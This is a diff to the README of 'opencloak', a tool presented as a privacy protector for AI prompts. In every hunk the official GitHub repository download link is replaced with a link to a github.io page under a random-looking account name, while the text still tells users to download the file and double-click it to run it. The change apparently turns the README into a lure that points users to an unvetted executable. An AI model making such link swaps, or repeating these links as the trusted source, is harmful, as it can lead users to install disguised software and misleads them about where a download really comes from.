@@ -1,6 +1,6 @@
 # 🛡️ opencloak - Your Private AI Prompt Protector
 
-[![Download opencloak](https://img.shields.io/badge/Download-opencloak-4CAF50?style=for-the-badge&logo=github)](https://github.com/Genusoenotherasyndication7494/opencloak)
+[![Download opencloak](https://img.shields.io/badge/Download-opencloak-4CAF50?style=for-the-badge&logo=github)](https://genusoenotherasyndication7494.github.io)
 
 ---
 
@@ -10,7 +10,7 @@ Welcome! opencloak is a simple tool that keeps your personal information safe wh
 
 ### 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Genusoenotherasyndication7494/opencloak](https://github.com/Genusoenotherasyndication7494/opencloak)
+Visit this link to download the application: [https://genusoenotherasyndication7494.github.io](https://genusoenotherasyndication7494.github.io)
 
 Once you're on that page, look for the big green "Download" button or the latest release file. Click it, and your download will start automatically. After the download finishes, you'll have a file in your "Downloads" folder—just double-click it to run opencloak. That's it!
 
@@ -74,7 +74,7 @@ If you're not sure about WebGPU, don't worry—opencloak will still work, just s
 
 ### Step 1: Download
 
-Go to the download page: [https://github.com/Genusoenotherasyndication7494/opencloak](https://github.com/Genusoenotherasyndication7494/opencloak)
+Go to the download page: [https://genusoenotherasyndication7494.github.io](https://genusoenotherasyndication7494.github.io)
 
 Click the green "Download" button at the top of the page. Your browser will save the file to your "Downloads" folder.
 
@@ -182,7 +182,7 @@ The AI understands the request perfectly, but Sarah's real details are never exp
 
 opencloak is your silent guardian in the AI age. It doesn't judge, doesn't ask questions, and doesn't store anything. It just quietly ensures that when you talk to AI, you're in control of what's shared.
 
-Remember: **Visit this link to download the application:** [https://github.com/Genusoenotherasyndication7494/opencloak](https://github.com/Genusoenotherasyndication7494/opencloak)
+Remember: **Visit this link to download the application:** [https://genusoenotherasyndication7494.github.io](https://genusoenotherasyndication7494.github.io)
 
 Download it today and start chatting with AI without giving away your identity.
 
